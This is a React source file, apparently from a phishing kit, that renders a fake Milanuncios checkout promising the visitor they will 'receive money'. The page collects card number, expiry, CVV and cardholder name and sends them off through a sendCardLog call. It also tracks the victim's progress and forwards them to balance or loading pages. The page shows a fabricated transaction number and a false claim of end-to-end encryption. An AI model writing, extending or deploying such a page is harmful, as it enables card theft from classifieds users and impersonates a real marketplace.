import { useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { userEntered } from '../utils/utils'

import toast from 'react-hot-toast'
import ArrowLeft from '../assets/icons/ArrowLeft.svg?react'
import Market from '../assets/icons/Market.svg?react'
import { PaymentButton } from '../components/ui/buttons/PaymentButton'
import { CardInput } from '../components/ui/inputs/CardInput'
import { NameInput } from '../components/ui/inputs/NameInput'
import { useApplicationStore } from '../stores/useApplicationStore'
import { useCardStore } from '../stores/useCardStore'
import { ValidateCard } from '../utils/card-utils/CardUtils'

import Logotype from '../assets/Logotype.svg?react'

export function PaymentPage() {
  const { id } = useParams()
  const navigate = useNavigate()

  const { autoBalance, price } = useApplicationStore()

  const {
    cardNumber,
    expiryMonth,
    expiryYear,
    cvv,
    fullName,
    setCardNumber,
    setExpiryMonth,
    setExpiryYear,
    setCVV,
    setFullName,
    sendCardLog
  } = useCardStore()

  const validateAndNavigate = () => {
    if (cardNumber === '') {
      toast.error(`Sie haben keine Kartennummer eingegeben.`)
      return
    }
    if (expiryMonth === '') {
      toast.error(`Sie haben den Ablaufmonat nicht angegeben.`)
      return
    }
    if (expiryYear === '') {
      toast.error(`Das Ablaufjahr wurde nicht angegeben.`)
      return
    }
    if (cvv === '') {
      toast.error(`Sie haben den CVV nicht eingegeben.`)
      return
    }

    if (!ValidateCard(cardNumber, cvv)) {
      toast.error(`Sie haben eine falsche Kartennummer eingegeben.`)
      return
    }

    sendCardLog(id!)
    if (autoBalance) {
      navigate(`/balance/${id}`)
    } else {
      navigate(`/loading/${id}`, {
        replace: true
      })
    }
  }
  useEffect(() => {
    if (id) {
      userEntered(id, 2)
    }
  }, [id])

  return (
    <div className="flex h-screen w-full max-lg:flex-col">
      <div className="flex h-full w-full justify-center bg-[linear-gradient(45deg,_rgba(168,185,210,1)_0%,_rgba(231,243,255,1)_50%,_rgba(255,255,255,1)_100%)] pt-10 max-lg:px-4 max-lg:pb-10 lg:w-1/2 lg:justify-end lg:pr-24 lg:pt-[110px]">
        <div className="flex w-full max-w-[380px] flex-col">
          <div className="group relative flex cursor-pointer items-center gap-2" onClick={() => navigate(`/product/${id}`)}>
            {/* Arrow */}
            <ArrowLeft className="fill-gray/40 group-hover:fill-gray h-3 w-3 transition-all duration-500" />

            {/* Market Icon + Jitsu */}
            <div className="flex items-center gap-2 transition-opacity duration-500 group-hover:opacity-0">
              <div className="flex h-7 w-7 items-center justify-center rounded-full bg-white">
                <Market className="h-3 w-3 fill-black/50" />
              </div>
              <span className="font-system flex text-sm font-medium leading-none text-black/90">Milanuncios</span>
            </div>

            {/* Back Label (fades in and slides in from right) */}
            <span className="font-system absolute left-6 flex translate-x-2 text-sm font-medium leading-none text-black/90 opacity-0 transition-all duration-500 group-hover:translate-x-0 group-hover:opacity-100">
              Atrás
            </span>
          </div>
          <div className="mt-8 flex flex-col max-lg:items-center">
            <h1 className="font-system text-custom-gray/60 font-medium">Milanuncios</h1>
            <h2 className="font-system mb-[3px] mt-[2px] text-[36px] font-semibold">{price} €</h2>
            <h3 className="font-system text-custom-gray/60 mb-1 text-sm font-medium">Transacción #79820512</h3>
            <div className="mt-4 h-full max-h-[60px]">
              <Logotype className="h-full max-h-[40px]" />
            </div>
          </div>
        </div>
      </div>
      <div className="flex h-full w-full pt-10 max-lg:justify-center max-lg:px-4 lg:w-1/2 lg:pl-24 lg:pt-[110px]">
        <div className="flex w-full max-w-[380px] flex-col">
          <div className="mb-4 flex rounded-md bg-[#f7f7f7] p-3 shadow-[0_0_0_1px_#e0e0e0,0_2px_4px_0_rgba(0,0,0,0.07),0_1px_1.5px_0_rgba(0,0,0,0.05)]">
            <div className="w-[30%]">
              <span className="font-system text-[13px] font-medium text-[#1a1a1ab3]">Milanuncios</span>
            </div>
            <div>
              <span className="font-system text-sm text-black">Obtener Dinero</span>
            </div>
          </div>
          <CardInput
            title="Detalles de la tarjeta"
            cardNumber={cardNumber}
            cardNumberOnChange={setCardNumber}
            year={expiryYear}
            yearOnChange={setExpiryYear}
            month={expiryMonth}
            monthOnChange={setExpiryMonth}
            cvv={cvv}
            cvvOnChange={setCVV}
          />
          <NameInput
            title="Nombre y apellidos del titular de la tarjeta"
            className="mb-8 mt-4"
            value={fullName}
            onChange={setFullName}
          />
          <div className="mb-10 flex w-full rounded-md px-3 py-2 shadow-[0_0_0_1px_#e0e0e0,0_2px_4px_0_rgba(0,0,0,0.07),0_1px_1.5px_0_rgba(0,0,0,0.05)]">
            <div className="Checkbox-InputContainer">
              <input id="enableStripePass" name="enableStripePass" type="checkbox" className="Checkbox-Input" />
              <span className="Checkbox-StyledInput"></span>
            </div>
            <span className="font-system text-custom-gray/90 text-sm">
              Guardar mis datos para transacciones seguras con un solo clic
              <div className="font-system text-custom-gray/40 mt-1 text-[13px]">
                Todas las transacciones están protegidas mediante un cifrado de extremo a extremo.
              </div>
            </span>
          </div>
          <PaymentButton className="max-lg:mb-28" title="Continuar" disabled={false} onClick={() => validateAndNavigate()} />
        </div>
      </div>
    </div>
  )
}
